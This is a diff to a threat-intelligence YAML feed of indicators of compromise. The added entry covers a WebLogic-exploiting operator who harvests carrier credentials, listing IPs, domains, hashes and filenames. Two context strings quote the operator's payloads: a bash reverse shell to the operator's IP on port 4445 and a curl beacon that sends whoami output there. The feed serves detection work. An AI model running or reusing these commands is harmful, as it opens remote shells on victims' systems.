@@ -4449,6 +4449,437 @@
     - type: "filename"
       value: "uacbypass.exe"
       context: "Generic operator filename seen on VT for Stage-5b"
+"opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817":
+  slug: "opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817"
+  page_url: "/ioc-feeds/opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817/"
+  title: "Carrier Credential Harvesting Through a Customer's Router"
+  date: "2026-08-18"
+  severity: "high"
+  feed_url: "/ioc-feeds/opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817-iocs.json"
+  report_url: "/reports/opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817/"
+  detection_url: "/hunting-detections/opendirectory-13-140-145-210-weblogic-deserialization-telecom-harvester-20260817-detections"
+  total: 137
+  untyped: 88
+  counts:
+    domain: 13
+    filename: 28
+    ipv4: 10
+    path: 11
+    sha1: 2
+    sha256: 70
+    url: 3
+  rows:
+    - type: "ipv4"
+      value: "104.21.41.159"
+      context: "Cloudflare proxy A record for radius-sync.com"
+    - type: "ipv4"
+      value: "13.140.145.210"
+      context: "Operator VPS and collection point"
+    - type: "ipv4"
+      value: "140.99.223.46"
+      context: null
+    - type: "ipv4"
+      value: "146.70.52.222"
+      context: null
+    - type: "ipv4"
+      value: "147.124.203.51"
+      context: null
+    - type: "ipv4"
+      value: "172.67.148.55"
+      context: "Cloudflare proxy A record for radius-sync.com"
+    - type: "ipv4"
+      value: "2.57.91.91"
+      context: null
+    - type: "ipv4"
+      value: "47.130.108.237"
+      context: null
+    - type: "ipv4"
+      value: "62.133.46.18"
+      context: null
+    - type: "ipv4"
+      value: "95.214.114.37"
+      context: "Operator attack-source VPN exit"
+    - type: "domain"
+      value: "c.pem"
+      context: null
+    - type: "domain"
+      value: "decrypt3des.py"
+      context: null
+    - type: "domain"
+      value: "exploit21182.java"
+      context: "CVE-2024-21182 server-side JNDI resolution variant"
+    - type: "domain"
+      value: "genbypass.java"
+      context: null
+    - type: "domain"
+      value: "i786.sh"
+      context: null
+    - type: "domain"
+      value: "k.pem"
+      context: "Private key for the operator certificate above"
+    - type: "domain"
+      value: "poc21839.py"
+      context: "Public houqe CVE-2023-21839 proof of concept, downloaded by tmp_jndi_rce.sh"
+    - type: "domain"
+      value: "radius-sync.com"
+      context: "Operator-owned domain"
+    - type: "domain"
+      value: "so.sh"
+      context: null
+    - type: "domain"
+      value: "ssrft3.java"
+      context: null
+    - type: "domain"
+      value: "vmi3432966.contaboserver.net"
+      context: "Operator VPS and collection point"
+    - type: "domain"
+      value: "xds.java"
+      context: null
+    - type: "domain"
+      value: "xscan.java"
+      context: "Threaded blind internal port scanner through WebLogic server-side JNDI resolution timing"
+    - type: "url"
+      value: "http://13.140.145.210/"
+      context: "Exfiltration destination in the WSMA fileCopy dstURL"
+    - type: "url"
+      value: "http://13.140.145.210:4445/"
+      context: "Beacon and reverse-shell callback endpoint"
+    - type: "url"
+      value: "http://13.140.145.210:8888/"
+      context: "Open directory and javaCodeBase staging URL for JNDI reference payloads"
+    - type: "sha256"
+      value: "04dbe46cf060c2de75ff04a13b0f2b48253c1b03a638a2afdae3cccdeeae500c"
+      context: "Additional chisel sessions, source of two of the four server key fingerprints"
+    - type: "sha256"
+      value: "08ae961db6b2564e26ba55ebe8aaf31920dc418b55010b0a2401ed995552c347"
+      context: null
+    - type: "sha256"
+      value: "0a76c28f5452dbbc146752d0b4e28b10779a337091f59650b94f5e938545572c"
+      context: "Stock jpillora chisel v1.23.1 linux/amd64"
+    - type: "sha256"
+      value: "1079a2f628fd6a33dae90515ecebecabf66eb3952c39635fd495dd3718173f64"
+      context: null
+    - type: "sha256"
+      value: "10ff5a12a4380e7e3209cd2c1cab14c1329160fb88d0ede2e4450e8ade6f4b79"
+      context: "Syntactically broken earlier draft of the C2 console client logic"
+    - type: "sha256"
+      value: "1351c03f626745cacd97f957419559da442264c0e0c4b100f496199dbd6301cc"
+      context: null
+    - type: "sha256"
+      value: "1766fd750011ad5d3b4f98357acb418f8ee07587c558c7fbe5169b7f3d8285c0"
+      context: null
+    - type: "sha256"
+      value: "19957b57916b3133fd69ca925304b1260c92d1f3b6857bcb9b48606b583a6455"
+      context: null
+    - type: "sha256"
+      value: "1f135e2ede4d2389e481d51d046e533ac485d15dc83396818d41bb81c7e84045"
+      context: null
+    - type: "sha256"
+      value: "25e713913758006835da0c0aa3aa621c37e21498114dadc8c4a8c00d6997d99b"
+      context: null
+    - type: "sha256"
+      value: "35792ca59beddfc9905c06c1a22b35b367d4f39083a0e59aea3a197f33af36e0"
+      context: "chisel server on port 443 with reverse SOCKS session establishment"
+    - type: "sha256"
+      value: "3797dddabdef5e9607c9c0bde108922467adf15d5e29cd6c6319df91b334a0c9"
+      context: null
+    - type: "sha256"
+      value: "395d83618e1ad08a61a70405f9c41f38202ad273ec2f748017a934c5a5020a32"
+      context: null
+    - type: "sha256"
+      value: "3fbfafab2e467055e22cf88719f081770fda732c278ad7244c938308f6b28c96"
+      context: "proxychains config chaining onward to the internal CATASTRO target"
+    - type: "sha256"
+      value: "403aad5736161e9b36c4f2c9a4451d0146b870c76627cc0afb28f2c038ab9af2"
+      context: null
+    - type: "sha256"
+      value: "4430563acc3e61903969f077fa2f868cc75158ec6719abb4031c115aa7e895ab"
+      context: "Beacon payload: curl http://13.140.145.210:4445/CLASS-RCE-$(whoami)"
+    - type: "sha256"
+      value: "45534cd8555fb79ebae27aaea8a6fbaec70d41ef5d9bc0a9415ed72e7ad23b00"
+      context: null
+    - type: "sha256"
+      value: "4bb64940f1f08d23a5b0733369a40f349dce28a8e677577e44dbf0d61ceb6faf"
+      context: null
+    - type: "sha256"
+      value: "4d53fc510a54cc1d3f9f6e8c14cb62bb784267ebcf15b6fc4126901fd81c32cc"
+      context: "Reverse shell payload: bash -i >& /dev/tcp/13.140.145.210/4445 0>&1"
+    - type: "sha256"
+      value: "4e722db95bf034806bf181f11065c6cb28578074b9fa613fd5018d1370db7ba2"
+      context: "chisel server on port 80 with SOCKS session"
+    - type: "sha256"
+      value: "5182ec0b8959cc554c8f3e06e8fad7a94b71f11de29d7c9c462fb500ef9d33bb"
+      context: null
+    - type: "sha256"
+      value: "53517fdc0d386c7dfd4546e9e83150f85dab0662dbcaf9bf0f9dd82fab3a07e9"
+      context: null
+    - type: "sha256"
+      value: "57808e07ba7745a2d598f630db9c6a671fe5cca005c6dbf4239b8ad794277143"
+      context: null
+    - type: "sha256"
+      value: "58475dcbda931c31e45a83884e366a28b34aaa9099bab8b2e38590824e3b61b3"
+      context: "Compiled reverse-shell payload class"
+    - type: "sha256"
+      value: "5a8aa26793cc031314eba327f40e384e2e0d009a7183e344e5db11f2cd3b185f"
+      context: "Mislabelled. Actually a captured WebLogic HTML error page, HTML 4.0 Draft doctype"
+    - type: "sha256"
+      value: "5ce9cdc2d2d5f5fd053ef7438626a9c98bc92ecc1eb2960fc6cffdc94e0ab550"
+      context: "Minimal Windows reconnaissance drop writing to out.txt"
+    - type: "sha256"
+      value: "5f2efa79f548b648a318e6c6f3512581574002b79fab97cfec10b77feba177b8"
+      context: null
+    - type: "sha256"
+      value: "610ff467df7cf2ea672762f4fd63c9a817b7d5f18f290efe8bdf239ddc8031f7"
+      context: null
+    - type: "sha256"
+      value: "626856f44bba5e61c878c2e2be54f3aa12a2fdee602634706917bc77aaaa4ef5"
+      context: "Second retail-bank probe variant capturing HTTP status codes"
+    - type: "sha256"
+      value: "628e3af996c506671d978026496c28e2ec0b4bc3a91302257d3b508d1ebd61f6"
+      context: null
+    - type: "sha256"
+      value: "6457ff57de0ee5b12abf6e3c8291e69718ea6ded741af51807259c692e7071c5"
+      context: null
+    - type: "sha256"
+      value: "65bd20aa232157ee4015e1d5b8939e953db0dd69a3c86a7387a33aedd2288b85"
+      context: "Operator-written T3 client with enum, bind and lookup actions. The CVE-2023-21839 trigger"
+    - type: "sha256"
+      value: "676437728db9710c645d509d7ccc517864a263914f9a152c1d49cad3106df900"
+      context: null
+    - type: "sha256"
+      value: "6ce28a27af3bf7732952461c6d6003c53ee0c367563f941b8dd481aefa2e7454"
+      context: null
+    - type: "sha256"
+      value: "72c6383477bbcb93811fd837a9e4721cfddea0cd238eebe3012acc0e6a31c40e"
+      context: null
+    - type: "sha256"
+      value: "7477eea61182c26fdd26e688bcc4f6ae87347e9a9290b81aae21b2fd71db0984"
+      context: null
+    - type: "sha256"
+      value: "75f99724611c680400f2ba567b71522a63122b0510ea7ef35c2696dd61666ecf"
+      context: "JNDI callback listener on port 4445 recording no inbound connection"
+    - type: "sha256"
+      value: "7b699b24025e3d71fd83dd766c7b842579cf28527f22a8fd5c9097ceaa7a013d"
+      context: "Private key for the operator certificate above"
+    - type: "sha256"
+      value: "80b9a4c5cde7f1793b4123662b2dddc2b3801e09fdc7ed8c295e10bad3397b9b"
+      context: null
+    - type: "sha256"
+      value: "885cfb5bfd041b8efd885860add9661eeab6086d2eb91997fffc420738e42ade"
+      context: null
+    - type: "sha256"
+      value: "891c4bb6b5c94b28867535c1ec71561be75b30da47554fbf6d55ae7f0d86be8b"
+      context: null
+    - type: "sha256"
+      value: "9251373f585c91b6bf7c407aa1a989e7cc596c4afc79a8573a18f858df9f014d"
+      context: "22-byte serialized String hello_from_ldap used to validate the LDAP/JNDI callback path"
+    - type: "sha256"
+      value: "953b668e95e033b34de0373af354cfd1d5557edf8cdfa49887cabf2b44d67b65"
+      context: null
+    - type: "sha256"
+      value: "9bebcc8ccfb9207b8265c85a4896760b8adee5deea0c2f57e6b08fc56a29e2ec"
+      context: "CVE-2024-21182 server-side JNDI resolution variant"
+    - type: "sha256"
+      value: "9e683ccc4baa5efdf4b643ade417cf56b729c5da1d351495d4317272b15f925f"
+      context: "Third retail-bank probe variant, concurrency escalated to 500"
+    - type: "sha256"
+      value: "9f2302cd9698895ac3d83e44fc0b3c99767cc1561bb18de6a2fb31acb5c15feb"
+      context: null
+    - type: "sha256"
+      value: "a133809a768c7c6b958d72ff6857677b14ed6bf284b99dc81a121442dfe04f90"
+      context: null
+    - type: "sha256"
+      value: "a652e3ae426e614844a5970154cb2a2e1465ab6fe73bbd3df47abeb6bdf859eb"
+      context: "Public houqe CVE-2023-21839 proof of concept, downloaded by tmp_jndi_rce.sh"
+    - type: "sha256"
+      value: "a71223b4b7d092f5a0cbcece6df94f907572f090c5db6bb68bcaaeb077c744d7"
+      context: "Core-dump Lua source carver with Spanish comments"
+    - type: "sha256"
+      value: "a93d8af6748c9c8ff1dbdffeed317cf81fe7777f25daf5c8feb44aa64d600463"
+      context: null
+    - type: "sha256"
+      value: "abcb8e8bd371549af056f973b95cceae9156b5b96e80facbc19db009347b2924"
+      context: "proxychains config pointing at the local SOCKS listener 127.0.0.1:1080"
+    - type: "sha256"
+      value: "bfb79c2d47b7bbd0cfc17782014eb7a57b73834ab93d49d7dd1e6942693ac8f2"
+      context: null
+    - type: "sha256"
+      value: "c17736b8535359e385fdc3e242d2a36c3b921469229c256947695a4716ad0e4d"
+      context: null
+    - type: "sha256"
+      value: "ce2bb74025dc77d4d5c506b990633f526f4f3f4ca849db7c0025d42d10a8529a"
+      context: null
+    - type: "sha256"
+      value: "d2ba9a1859464c4f08c47643d2e157400a94b31b429d4415acb4389944ee016a"
+      context: null
+    - type: "sha256"
+      value: "daee2d57566c88374b5de65ecc04e1321da4d5dc35b84a0eb98893afad9e2664"
+      context: null
+    - type: "sha256"
+      value: "dbbdffa94caf45a4c1f9132fa7c5bfc6a4c20ee104440ba964cc99ea9850facb"
+      context: "Threaded blind internal port scanner through WebLogic server-side JNDI resolution timing"
+    - type: "sha256"
+      value: "dcd739dfe08285c08200be926905155576bedc4e5633b5f02561ec7f80d512f1"
+      context: "GeoServer default-credential test and CVE-2024-36401 OGC-filter RCE test against CATASTRO"
+    - type: "sha256"
+      value: "e447cbfbb5e82bd6b924cd6d9265d022a9ab576898c34ee6b854b9269ff9e870"
+      context: "Leaks the name of an unarchived carrier-targeting script: /tmp/andinet.sh line 122"
+    - type: "sha256"
+      value: "e5621ffe4879f0ec39ed40f688db9399c2d43054d41ef14472fa335c4693b915"
+      context: null
+    - type: "sha256"
+      value: "e74276ce204476787aaa65c0f0604707c918a06b724ceaa98eb57f2105c65157"
+      context: "chisel server startup log"
+    - type: "sha256"
+      value: "e788774dfe961c999953ef72a208f198c58c47f14d4b7777d50abee835d75fff"
+      context: null
+    - type: "sha256"
+      value: "e788f829b1a0141a488afb5f82b94f13035623609ca3b83f0c6985919cd9e83b"
+      context: null
+    - type: "sha256"
+      value: "ee2d150a2f73a561983088a6b1a6a2b1c452777aaf03181387708c6907ac6dcd"
+      context: null
+    - type: "sha256"
+      value: "f03e4111413befd8e44035c7fa56abf48fb12a0d03a6eda5662de33ffe47e2e7"
+      context: null
+    - type: "sha256"
+      value: "fa433bbbc82c572c838ac6a9f0bdde3634c8fbae4178d3660bf0dcb1a958e262"
+      context: null
+    - type: "sha256"
+      value: "fa434d13bee84e9a4ccfffbd8df2852d9d1238f8222bf806506b108d21924557"
+      context: null
+    - type: "sha256"
+      value: "fa930afe099b266006f22fe75245f4d52b52a11de7280b6c2cff8e3a4e4b3e06"
+      context: null
+    - type: "sha256"
+      value: "fae8fe13ac0e717d99f992fba9186aa37fb706058fe7762993717366f653d14a"
+      context: "Retail-bank password-reset endpoint probe, customerId iteration at escalating concurrency"
+    - type: "sha256"
+      value: "fd628df5bf58c7abaebfca3ecfe504511080872bf1687ec2dd39d1d4cd3f0aab"
+      context: null
+    - type: "sha1"
+      value: "373b099212237996e4394bdf8dd5a27715dccf13"
+      context: null
+    - type: "sha1"
+      value: "aab136e06c94e5616832afa34af096bd6b77151c"
+      context: null
+    - type: "path"
+      value: "/opt/aaa/bin/radstatd"
+      context: null
+    - type: "path"
+      value: "/root/.ssh/sysgad_key"
+      context: null
+    - type: "path"
+      value: "/tmp/CVE-2023-21839/"
+      context: null
+    - type: "path"
+      value: "/tmp/andinet.sh"
+      context: null
+    - type: "path"
+      value: "/tmp/prtg_devices.json"
+      context: null
+    - type: "path"
+      value: "/usr/local/bin/pollRadiusLog.php"
+      context: null
+    - type: "path"
+      value: "/usr/local/bin/safe_pollRadiusLog.sh"
+      context: null
+    - type: "path"
+      value: "C:\\wamp64\\www\\.s.bak"
+      context: null
+    - type: "path"
+      value: "C:\\wamp64\\www\\.y.bak"
+      context: null
+    - type: "path"
+      value: "C:\\wamp64\\www\\h.php"
+      context: null
+    - type: "path"
+      value: "C:\\wamp64\\www\\x.php"
+      context: null
+    - type: "filename"
+      value: "chisel443.log"
+      context: "chisel server on port 443 with reverse SOCKS session establishment"
+    - type: "filename"
+      value: "chisel80.log"
+      context: "chisel server on port 80 with SOCKS session"
+    - type: "filename"
+      value: "chisel_new.log"
+      context: "Additional chisel sessions, source of two of the four server key fingerprints"
+    - type: "filename"
+      value: "chisel_server.log"
+      context: "chisel server startup log"
+    - type: "filename"
+      value: "chisel_win.exe"
+      context: null
+    - type: "filename"
+      value: "combined_wordlist.txt"
+      context: null
+    - type: "filename"
+      value: "docker_output.txt"
+      context: null
+    - type: "filename"
+      value: "exfil_capture.log"
+      context: null
+    - type: "filename"
+      value: "exfil_cores_batch.log"
+      context: null
+    - type: "filename"
+      value: "http80.log"
+      context: null
+    - type: "filename"
+      value: "hybrid_wordlist.txt"
+      context: null
+    - type: "filename"
+      value: "iiop_resp.bin"
+      context: "Mislabelled. Actually a captured WebLogic HTML error page, HTML 4.0 Draft doctype"
+    - type: "filename"
+      value: "jndi_cb.txt"
+      context: "JNDI callback listener on port 4445 recording no inbound connection"
+    - type: "filename"
+      value: "jndiexploit.jar"
+      context: null
+    - type: "filename"
+      value: "lua_source.txt"
+      context: null
+    - type: "filename"
+      value: "movistar_wordlist.txt"
+      context: null
+    - type: "filename"
+      value: "pkg_names.txt"
+      context: null
+    - type: "filename"
+      value: "plink.exe"
+      context: null
+    - type: "filename"
+      value: "proxychains_catastro.conf"
+      context: "proxychains config chaining onward to the internal CATASTRO target"
+    - type: "filename"
+      value: "proxychains_chisel.conf"
+      context: "proxychains config pointing at the local SOCKS listener 127.0.0.1:1080"
+    - type: "filename"
+      value: "r.bat"
+      context: "Minimal Windows reconnaissance drop writing to out.txt"
+    - type: "filename"
+      value: "serve_http.log"
+      context: null
+    - type: "filename"
+      value: "sph_cve.txt"
+      context: null
+    - type: "filename"
+      value: "ssrf_results.txt"
+      context: null
+    - type: "filename"
+      value: "string_payload.bin"
+      context: "22-byte serialized String hello_from_ldap used to validate the LDAP/JNDI callback path"
+    - type: "filename"
+      value: "t35.txt"
+      context: null
+    - type: "filename"
+      value: "wl_resp.txt"
+      context: null
+    - type: "filename"
+      value: "wl_t3.txt"
+      context: null
 "opendirectory-193-56-255-154-20260403":
   slug: "opendirectory-193-56-255-154-20260403"
   page_url: "/ioc-feeds/opendirectory-193-56-255-154-20260403/"
@@ -6724,7 +7155,7 @@
   feed_url: "/ioc-feeds/russian-gemini-credential-mill-213.165.51.115-iocs.json"
   report_url: "/reports/russian-gemini-credential-mill-213.165.51.115/"
   detection_url: "/hunting-detections/russian-gemini-credential-mill-213.165.51.115-detections"
-  total: 59
+  total: 60
   untyped: 143
   counts:
     domain: 32
@@ -6734,6 +7165,7 @@
     md5: 1
     path: 5
     registry: 1
+    sha256: 1
     url: 8
   rows:
     - type: "ipv4"
@@ -6873,6 +7305,9 @@
       context: "Operator's stager PowerShell, first stage of universal infection one-liner"
     - type: "url"
       value: "https://the-hunters-ledger.com/reports/russian-gemini-credential-mill-213.165.51.115/"
+      context: null
+    - type: "sha256"
+      value: "981036cec38c6fd9796fc64a102100b97983f56b3482cc3e1f1610e14a1fae58"
       context: null
     - type: "md5"
       value: "31d6cfe0d16ae931b73c59d7e0c089c0"
